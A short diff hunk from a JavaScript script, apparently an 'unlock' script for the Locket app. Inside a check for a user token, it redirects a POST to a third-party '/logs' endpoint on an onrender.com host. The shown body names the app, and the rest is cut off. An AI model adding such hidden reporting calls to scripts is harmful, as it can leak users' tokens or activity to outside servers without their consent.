@@ -56,7 +56,7 @@
 
   if (userToken) {
     $httpClient.post({
-        url: "https://rudo-watch-be.onrender.com/logs",
+        url: "https://ductoandev-unlock.onrender.com/logs",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
             app: "Locket",
